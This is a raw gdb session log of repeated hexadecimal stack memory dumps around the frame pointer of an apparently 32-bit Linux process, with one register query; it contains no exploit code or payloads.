0xbfbf854c:     0xb7d87f21      0xb7f47000      0xb7f47000      0x00000000
0xbfbf855c:     0xb7d87f21      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf856c:     0xbfbf8584      0x00000001      0x00000000      0xb7f47000
0xbfbf857c:     0xb7f7a76a      0xb7f92000      0x00000000      0xb7f47000
0xbfbf858c:     0x00000000      0x00000000      0x75384b7b      0xbacf4d6b
0xbfbf859c:     0x00000000      0x00000000      0x00000000      0x00000002
0xbfbf85ac:     0x080484e0      0x00000000      0xb7f7fe30      0xb7f7a9c0
0xbfbf85bc:     0x0804a000      0x00000002      0x080484e0      0x00000000
0xbfbf85cc:     0x08048512      0x080486d4      0x00000002      0xbfbf85f4
0xbfbf85dc:     0x08048750      0x080487b0      0xb7f7a9c0      0xbfbf85ec
0xbfbf85ec:     0xb7f92940      0x00000002      0xbfbf96e0      0xbfbf9700
(gdb) x/60x $ebp - 8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
(gdb) x/60x $ebp - 12
0xbfbf850c:     0x00000028      0x00000000      0xb7e5fb66      0xbfbf8548
0xbfbf851c:     0x0804873b      0xbfbf9700      0x000003ee      0xbfbf8548
0xbfbf852c:     0x080486f4      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf853c:     0x08048888      0xbfbf8560      0x00000000      0x00000000
0xbfbf854c:     0xb7d87f21      0xb7f47000      0xb7f47000      0x00000000
0xbfbf855c:     0xb7d87f21      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf856c:     0xbfbf8584      0x00000001      0x00000000      0xb7f47000
0xbfbf857c:     0xb7f7a76a      0xb7f92000      0x00000000      0xb7f47000
0xbfbf858c:     0x00000000      0x00000000      0x75384b7b      0xbacf4d6b
0xbfbf859c:     0x00000000      0x00000000      0x00000000      0x00000002
0xbfbf85ac:     0x080484e0      0x00000000      0xb7f7fe30      0xb7f7a9c0
0xbfbf85bc:     0x0804a000      0x00000002      0x080484e0      0x00000000
0xbfbf85cc:     0x08048512      0x080486d4      0x00000002      0xbfbf85f4
0xbfbf85dc:     0x08048750      0x080487b0      0xb7f7a9c0      0xbfbf85ec
0xbfbf85ec:     0xb7f92940      0x00000002      0xbfbf96e0      0xbfbf9700
(gdb) x/60x $ebp - 24
0xbfbf8500:     0x00000000      0x00000000      0x00000000      0x00000028
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
(gdb) x/60x $ebp - 48
0xbfbf84e8:     0xb7d88015      0xb7e5fbf5      0xb7f79f69      0xbfbf8560
0xbfbf84f8:     0xb7f47000      0x00000000      0x00000000      0x00000000
0xbfbf8508:     0x00000000      0x00000028      0x00000000      0xb7e5fb66
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
0xbfbf8538:     0xbfbf8600      0x08048888      0xbfbf8560      0x00000000
0xbfbf8548:     0x00000000      0xb7d87f21      0xb7f47000      0xb7f47000
0xbfbf8558:     0x00000000      0xb7d87f21      0x00000002      0xbfbf85f4
0xbfbf8568:     0xbfbf8600      0xbfbf8584      0x00000001      0x00000000
0xbfbf8578:     0xb7f47000      0xb7f7a76a      0xb7f92000      0x00000000
0xbfbf8588:     0xb7f47000      0x00000000      0x00000000      0x75384b7b
0xbfbf8598:     0xbacf4d6b      0x00000000      0x00000000      0x00000000
0xbfbf85a8:     0x00000002      0x080484e0      0x00000000      0xb7f7fe30
0xbfbf85b8:     0xb7f7a9c0      0x0804a000      0x00000002      0x080484e0
0xbfbf85c8:     0x00000000      0x08048512      0x080486d4      0x00000002
(gdb) x/60x $ebp - 50
0xbfbf84e6:     0x80150000      0xfbf5b7d8      0x9f69b7e5      0x8560b7f7
0xbfbf84f6:     0x7000bfbf      0x0000b7f4      0x00000000      0x00000000
0xbfbf8506:     0x00000000      0x00280000      0x00000000      0xfb660000
0xbfbf8516:     0x8548b7e5      0x873bbfbf      0x97000804      0x03eebfbf
0xbfbf8526:     0x85480000      0x86f4bfbf      0x00020804      0x85f40000
0xbfbf8536:     0x8600bfbf      0x8888bfbf      0x85600804      0x0000bfbf
0xbfbf8546:     0x00000000      0x7f210000      0x7000b7d8      0x7000b7f4
0xbfbf8556:     0x0000b7f4      0x7f210000      0x0002b7d8      0x85f40000
0xbfbf8566:     0x8600bfbf      0x8584bfbf      0x0001bfbf      0x00000000
0xbfbf8576:     0x70000000      0xa76ab7f4      0x2000b7f7      0x0000b7f9
0xbfbf8586:     0x70000000      0x0000b7f4      0x00000000      0x4b7b0000
0xbfbf8596:     0x4d6b7538      0x0000bacf      0x00000000      0x00000000
0xbfbf85a6:     0x00020000      0x84e00000      0x00000804      0xfe300000
0xbfbf85b6:     0xa9c0b7f7      0xa000b7f7      0x00020804      0x84e00000
0xbfbf85c6:     0x00000804      0x85120000      0x86d40804      0x00020804
(gdb) x/80x $ebp - 50
0xbfbf84e6:     0x80150000      0xfbf5b7d8      0x9f69b7e5      0x8560b7f7
0xbfbf84f6:     0x7000bfbf      0x0000b7f4      0x00000000      0x00000000
0xbfbf8506:     0x00000000      0x00280000      0x00000000      0xfb660000
0xbfbf8516:     0x8548b7e5      0x873bbfbf      0x97000804      0x03eebfbf
0xbfbf8526:     0x85480000      0x86f4bfbf      0x00020804      0x85f40000
0xbfbf8536:     0x8600bfbf      0x8888bfbf      0x85600804      0x0000bfbf
0xbfbf8546:     0x00000000      0x7f210000      0x7000b7d8      0x7000b7f4
0xbfbf8556:     0x0000b7f4      0x7f210000      0x0002b7d8      0x85f40000
0xbfbf8566:     0x8600bfbf      0x8584bfbf      0x0001bfbf      0x00000000
0xbfbf8576:     0x70000000      0xa76ab7f4      0x2000b7f7      0x0000b7f9
0xbfbf8586:     0x70000000      0x0000b7f4      0x00000000      0x4b7b0000
0xbfbf8596:     0x4d6b7538      0x0000bacf      0x00000000      0x00000000
0xbfbf85a6:     0x00020000      0x84e00000      0x00000804      0xfe300000
0xbfbf85b6:     0xa9c0b7f7      0xa000b7f7      0x00020804      0x84e00000
0xbfbf85c6:     0x00000804      0x85120000      0x86d40804      0x00020804
0xbfbf85d6:     0x85f40000      0x8750bfbf      0x87b00804      0xa9c00804
0xbfbf85e6:     0x85ecb7f7      0x2940bfbf      0x0002b7f9      0x96e00000
0xbfbf85f6:     0x9700bfbf      0x0000bfbf      0x97150000      0x9d01bfbf
0xbfbf8606:     0x9d35bfbf      0x9d57bfbf      0x9d66bfbf      0x9d77bfbf
0xbfbf8616:     0x9d8bbfbf      0x9d9ebfbf      0x9daabfbf      0x9dccbfbf
(gdb) x/80x $ebp - 8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
0xbfbf8600:     0xbfbf9715      0xbfbf9d01      0xbfbf9d35      0xbfbf9d57
0xbfbf8610:     0xbfbf9d66      0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e
0xbfbf8620:     0xbfbf9daa      0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06
0xbfbf8630:     0xbfbf9e18      0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e
0xbfbf8640:     0xbfbf9ea4      0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7
(gdb) x/80x $ebp
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
0xbfbf8538:     0xbfbf8600      0x08048888      0xbfbf8560      0x00000000
0xbfbf8548:     0x00000000      0xb7d87f21      0xb7f47000      0xb7f47000
0xbfbf8558:     0x00000000      0xb7d87f21      0x00000002      0xbfbf85f4
0xbfbf8568:     0xbfbf8600      0xbfbf8584      0x00000001      0x00000000
0xbfbf8578:     0xb7f47000      0xb7f7a76a      0xb7f92000      0x00000000
0xbfbf8588:     0xb7f47000      0x00000000      0x00000000      0x75384b7b
0xbfbf8598:     0xbacf4d6b      0x00000000      0x00000000      0x00000000
0xbfbf85a8:     0x00000002      0x080484e0      0x00000000      0xb7f7fe30
0xbfbf85b8:     0xb7f7a9c0      0x0804a000      0x00000002      0x080484e0
0xbfbf85c8:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfbf85d8:     0xbfbf85f4      0x08048750      0x080487b0      0xb7f7a9c0
0xbfbf85e8:     0xbfbf85ec      0xb7f92940      0x00000002      0xbfbf96e0
0xbfbf85f8:     0xbfbf9700      0x00000000      0xbfbf9715      0xbfbf9d01
0xbfbf8608:     0xbfbf9d35      0xbfbf9d57      0xbfbf9d66      0xbfbf9d77
0xbfbf8618:     0xbfbf9d8b      0xbfbf9d9e      0xbfbf9daa      0xbfbf9dcc
0xbfbf8628:     0xbfbf9ded      0xbfbf9e06      0xbfbf9e18      0xbfbf9e3a
0xbfbf8638:     0xbfbf9e7b      0xbfbf9e8e      0xbfbf9ea4      0xbfbf9eb4
0xbfbf8648:     0xbfbf9ebf      0xbfbf9ec7      0xbfbf9ed6      0xbfbf9f0c
(gdb) x/80x $ebp - 12
0xbfbf850c:     0x00000028      0x00000000      0xb7e5fb66      0xbfbf8548
0xbfbf851c:     0x0804873b      0xbfbf9700      0x000003ee      0xbfbf8548
0xbfbf852c:     0x080486f4      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf853c:     0x08048888      0xbfbf8560      0x00000000      0x00000000
0xbfbf854c:     0xb7d87f21      0xb7f47000      0xb7f47000      0x00000000
0xbfbf855c:     0xb7d87f21      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf856c:     0xbfbf8584      0x00000001      0x00000000      0xb7f47000
0xbfbf857c:     0xb7f7a76a      0xb7f92000      0x00000000      0xb7f47000
0xbfbf858c:     0x00000000      0x00000000      0x75384b7b      0xbacf4d6b
0xbfbf859c:     0x00000000      0x00000000      0x00000000      0x00000002
0xbfbf85ac:     0x080484e0      0x00000000      0xb7f7fe30      0xb7f7a9c0
0xbfbf85bc:     0x0804a000      0x00000002      0x080484e0      0x00000000
0xbfbf85cc:     0x08048512      0x080486d4      0x00000002      0xbfbf85f4
0xbfbf85dc:     0x08048750      0x080487b0      0xb7f7a9c0      0xbfbf85ec
0xbfbf85ec:     0xb7f92940      0x00000002      0xbfbf96e0      0xbfbf9700
0xbfbf85fc:     0x00000000      0xbfbf9715      0xbfbf9d01      0xbfbf9d35
0xbfbf860c:     0xbfbf9d57      0xbfbf9d66      0xbfbf9d77      0xbfbf9d8b
0xbfbf861c:     0xbfbf9d9e      0xbfbf9daa      0xbfbf9dcc      0xbfbf9ded
0xbfbf862c:     0xbfbf9e06      0xbfbf9e18      0xbfbf9e3a      0xbfbf9e7b
0xbfbf863c:     0xbfbf9e8e      0xbfbf9ea4      0xbfbf9eb4      0xbfbf9ebf
(gdb) x/80x $ebp - 8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
0xbfbf8600:     0xbfbf9715      0xbfbf9d01      0xbfbf9d35      0xbfbf9d57
0xbfbf8610:     0xbfbf9d66      0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e
0xbfbf8620:     0xbfbf9daa      0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06
0xbfbf8630:     0xbfbf9e18      0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e
0xbfbf8640:     0xbfbf9ea4      0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7
(gdb) x/80x $ebp - 10
0xbfbf850e:     0x00000000      0xfb660000      0x8548b7e5      0x873bbfbf
0xbfbf851e:     0x97000804      0x03eebfbf      0x85480000      0x86f4bfbf
0xbfbf852e:     0x00020804      0x85f40000      0x8600bfbf      0x8888bfbf
0xbfbf853e:     0x85600804      0x0000bfbf      0x00000000      0x7f210000
0xbfbf854e:     0x7000b7d8      0x7000b7f4      0x0000b7f4      0x7f210000
0xbfbf855e:     0x0002b7d8      0x85f40000      0x8600bfbf      0x8584bfbf
0xbfbf856e:     0x0001bfbf      0x00000000      0x70000000      0xa76ab7f4
0xbfbf857e:     0x2000b7f7      0x0000b7f9      0x70000000      0x0000b7f4
0xbfbf858e:     0x00000000      0x4b7b0000      0x4d6b7538      0x0000bacf
0xbfbf859e:     0x00000000      0x00000000      0x00020000      0x84e00000
0xbfbf85ae:     0x00000804      0xfe300000      0xa9c0b7f7      0xa000b7f7
0xbfbf85be:     0x00020804      0x84e00000      0x00000804      0x85120000
0xbfbf85ce:     0x86d40804      0x00020804      0x85f40000      0x8750bfbf
0xbfbf85de:     0x87b00804      0xa9c00804      0x85ecb7f7      0x2940bfbf
0xbfbf85ee:     0x0002b7f9      0x96e00000      0x9700bfbf      0x0000bfbf
0xbfbf85fe:     0x97150000      0x9d01bfbf      0x9d35bfbf      0x9d57bfbf
0xbfbf860e:     0x9d66bfbf      0x9d77bfbf      0x9d8bbfbf      0x9d9ebfbf
0xbfbf861e:     0x9daabfbf      0x9dccbfbf      0x9dedbfbf      0x9e06bfbf
0xbfbf862e:     0x9e18bfbf      0x9e3abfbf      0x9e7bbfbf      0x9e8ebfbf
0xbfbf863e:     0x9ea4bfbf      0x9eb4bfbf      0x9ebfbfbf      0x9ec7bfbf
(gdb) x/80x $ebp + 8
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
0xbfbf8600:     0xbfbf9715      0xbfbf9d01      0xbfbf9d35      0xbfbf9d57
0xbfbf8610:     0xbfbf9d66      0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e
0xbfbf8620:     0xbfbf9daa      0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06
0xbfbf8630:     0xbfbf9e18      0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e
0xbfbf8640:     0xbfbf9ea4      0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7
0xbfbf8650:     0xbfbf9ed6      0xbfbf9f0c      0xbfbf9f2b      0xbfbf9fbc
(gdb) Quit
(gdb) x/80x $ebp - 0x8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
0xbfbf8600:     0xbfbf9715      0xbfbf9d01      0xbfbf9d35      0xbfbf9d57
0xbfbf8610:     0xbfbf9d66      0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e
0xbfbf8620:     0xbfbf9daa      0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06
0xbfbf8630:     0xbfbf9e18      0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e
0xbfbf8640:     0xbfbf9ea4      0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7
(gdb) info reg $ebp
ebp            0xbfbf8518       0xbfbf8518
(gdb) x/80x $ebp - 0x4
0xbfbf8514:     0xb7e5fb66      0xbfbf8548      0x0804873b      0xbfbf9700
0xbfbf8524:     0x000003ee      0xbfbf8548      0x080486f4      0x00000002
0xbfbf8534:     0xbfbf85f4      0xbfbf8600      0x08048888      0xbfbf8560
0xbfbf8544:     0x00000000      0x00000000      0xb7d87f21      0xb7f47000
0xbfbf8554:     0xb7f47000      0x00000000      0xb7d87f21      0x00000002
0xbfbf8564:     0xbfbf85f4      0xbfbf8600      0xbfbf8584      0x00000001
0xbfbf8574:     0x00000000      0xb7f47000      0xb7f7a76a      0xb7f92000
0xbfbf8584:     0x00000000      0xb7f47000      0x00000000      0x00000000
0xbfbf8594:     0x75384b7b      0xbacf4d6b      0x00000000      0x00000000
0xbfbf85a4:     0x00000000      0x00000002      0x080484e0      0x00000000
0xbfbf85b4:     0xb7f7fe30      0xb7f7a9c0      0x0804a000      0x00000002
0xbfbf85c4:     0x080484e0      0x00000000      0x08048512      0x080486d4
0xbfbf85d4:     0x00000002      0xbfbf85f4      0x08048750      0x080487b0
0xbfbf85e4:     0xb7f7a9c0      0xbfbf85ec      0xb7f92940      0x00000002
0xbfbf85f4:     0xbfbf96e0      0xbfbf9700      0x00000000      0xbfbf9715
0xbfbf8604:     0xbfbf9d01      0xbfbf9d35      0xbfbf9d57      0xbfbf9d66
0xbfbf8614:     0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e      0xbfbf9daa
0xbfbf8624:     0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06      0xbfbf9e18
0xbfbf8634:     0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e      0xbfbf9ea4
0xbfbf8644:     0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7      0xbfbf9ed6
(gdb) x/80x $ebp - 0x2
0xbfbf8516:     0x8548b7e5      0x873bbfbf      0x97000804      0x03eebfbf
0xbfbf8526:     0x85480000      0x86f4bfbf      0x00020804      0x85f40000
0xbfbf8536:     0x8600bfbf      0x8888bfbf      0x85600804      0x0000bfbf
0xbfbf8546:     0x00000000      0x7f210000      0x7000b7d8      0x7000b7f4
0xbfbf8556:     0x0000b7f4      0x7f210000      0x0002b7d8      0x85f40000
0xbfbf8566:     0x8600bfbf      0x8584bfbf      0x0001bfbf      0x00000000
0xbfbf8576:     0x70000000      0xa76ab7f4      0x2000b7f7      0x0000b7f9
0xbfbf8586:     0x70000000      0x0000b7f4      0x00000000      0x4b7b0000
0xbfbf8596:     0x4d6b7538      0x0000bacf      0x00000000      0x00000000
0xbfbf85a6:     0x00020000      0x84e00000      0x00000804      0xfe300000
0xbfbf85b6:     0xa9c0b7f7      0xa000b7f7      0x00020804      0x84e00000
0xbfbf85c6:     0x00000804      0x85120000      0x86d40804      0x00020804
0xbfbf85d6:     0x85f40000      0x8750bfbf      0x87b00804      0xa9c00804
0xbfbf85e6:     0x85ecb7f7      0x2940bfbf      0x0002b7f9      0x96e00000
0xbfbf85f6:     0x9700bfbf      0x0000bfbf      0x97150000      0x9d01bfbf
0xbfbf8606:     0x9d35bfbf      0x9d57bfbf      0x9d66bfbf      0x9d77bfbf
0xbfbf8616:     0x9d8bbfbf      0x9d9ebfbf      0x9daabfbf      0x9dccbfbf
0xbfbf8626:     0x9dedbfbf      0x9e06bfbf      0x9e18bfbf      0x9e3abfbf
0xbfbf8636:     0x9e7bbfbf      0x9e8ebfbf      0x9ea4bfbf      0x9eb4bfbf
0xbfbf8646:     0x9ebfbfbf      0x9ec7bfbf      0x9ed6bfbf      0x9f0cbfbf
(gdb) x/80x $ebp 
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
0xbfbf8538:     0xbfbf8600      0x08048888      0xbfbf8560      0x00000000
0xbfbf8548:     0x00000000      0xb7d87f21      0xb7f47000      0xb7f47000
0xbfbf8558:     0x00000000      0xb7d87f21      0x00000002      0xbfbf85f4
0xbfbf8568:     0xbfbf8600      0xbfbf8584      0x00000001      0x00000000
0xbfbf8578:     0xb7f47000      0xb7f7a76a      0xb7f92000      0x00000000
0xbfbf8588:     0xb7f47000      0x00000000      0x00000000      0x75384b7b
0xbfbf8598:     0xbacf4d6b      0x00000000      0x00000000      0x00000000
0xbfbf85a8:     0x00000002      0x080484e0      0x00000000      0xb7f7fe30
0xbfbf85b8:     0xb7f7a9c0      0x0804a000      0x00000002      0x080484e0
0xbfbf85c8:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfbf85d8:     0xbfbf85f4      0x08048750      0x080487b0      0xb7f7a9c0
0xbfbf85e8:     0xbfbf85ec      0xb7f92940      0x00000002      0xbfbf96e0
0xbfbf85f8:     0xbfbf9700      0x00000000      0xbfbf9715      0xbfbf9d01
0xbfbf8608:     0xbfbf9d35      0xbfbf9d57      0xbfbf9d66      0xbfbf9d77
0xbfbf8618:     0xbfbf9d8b      0xbfbf9d9e      0xbfbf9daa      0xbfbf9dcc
0xbfbf8628:     0xbfbf9ded      0xbfbf9e06      0xbfbf9e18      0xbfbf9e3a
0xbfbf8638:     0xbfbf9e7b      0xbfbf9e8e      0xbfbf9ea4      0xbfbf9eb4
0xbfbf8648:     0xbfbf9ebf      0xbfbf9ec7      0xbfbf9ed6      0xbfbf9f0c
(gdb) x/80x $ebp - 0x4
0xbfbf8514:     0xb7e5fb66      0xbfbf8548      0x0804873b      0xbfbf9700
0xbfbf8524:     0x000003ee      0xbfbf8548      0x080486f4      0x00000002
0xbfbf8534:     0xbfbf85f4      0xbfbf8600      0x08048888      0xbfbf8560
0xbfbf8544:     0x00000000      0x00000000      0xb7d87f21      0xb7f47000
0xbfbf8554:     0xb7f47000      0x00000000      0xb7d87f21      0x00000002
0xbfbf8564:     0xbfbf85f4      0xbfbf8600      0xbfbf8584      0x00000001
0xbfbf8574:     0x00000000      0xb7f47000      0xb7f7a76a      0xb7f92000
0xbfbf8584:     0x00000000      0xb7f47000      0x00000000      0x00000000
0xbfbf8594:     0x75384b7b      0xbacf4d6b      0x00000000      0x00000000
0xbfbf85a4:     0x00000000      0x00000002      0x080484e0      0x00000000
0xbfbf85b4:     0xb7f7fe30      0xb7f7a9c0      0x0804a000      0x00000002
0xbfbf85c4:     0x080484e0      0x00000000      0x08048512      0x080486d4
0xbfbf85d4:     0x00000002      0xbfbf85f4      0x08048750      0x080487b0
0xbfbf85e4:     0xb7f7a9c0      0xbfbf85ec      0xb7f92940      0x00000002
0xbfbf85f4:     0xbfbf96e0      0xbfbf9700      0x00000000      0xbfbf9715
0xbfbf8604:     0xbfbf9d01      0xbfbf9d35      0xbfbf9d57      0xbfbf9d66
0xbfbf8614:     0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e      0xbfbf9daa
0xbfbf8624:     0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06      0xbfbf9e18
0xbfbf8634:     0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e      0xbfbf9ea4
0xbfbf8644:     0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7      0xbfbf9ed6
(gdb) x/80dx $ebp - 0x4
0xbfbf8514:     0xb7e5fb66      0xbfbf8548      0x0804873b      0xbfbf9700
0xbfbf8524:     0x000003ee      0xbfbf8548      0x080486f4      0x00000002
0xbfbf8534:     0xbfbf85f4      0xbfbf8600      0x08048888      0xbfbf8560
0xbfbf8544:     0x00000000      0x00000000      0xb7d87f21      0xb7f47000
0xbfbf8554:     0xb7f47000      0x00000000      0xb7d87f21      0x00000002
0xbfbf8564:     0xbfbf85f4      0xbfbf8600      0xbfbf8584      0x00000001
0xbfbf8574:     0x00000000      0xb7f47000      0xb7f7a76a      0xb7f92000
0xbfbf8584:     0x00000000      0xb7f47000      0x00000000      0x00000000
0xbfbf8594:     0x75384b7b      0xbacf4d6b      0x00000000      0x00000000
0xbfbf85a4:     0x00000000      0x00000002      0x080484e0      0x00000000
0xbfbf85b4:     0xb7f7fe30      0xb7f7a9c0      0x0804a000      0x00000002
0xbfbf85c4:     0x080484e0      0x00000000      0x08048512      0x080486d4
0xbfbf85d4:     0x00000002      0xbfbf85f4      0x08048750      0x080487b0
0xbfbf85e4:     0xb7f7a9c0      0xbfbf85ec      0xb7f92940      0x00000002
0xbfbf85f4:     0xbfbf96e0      0xbfbf9700      0x00000000      0xbfbf9715
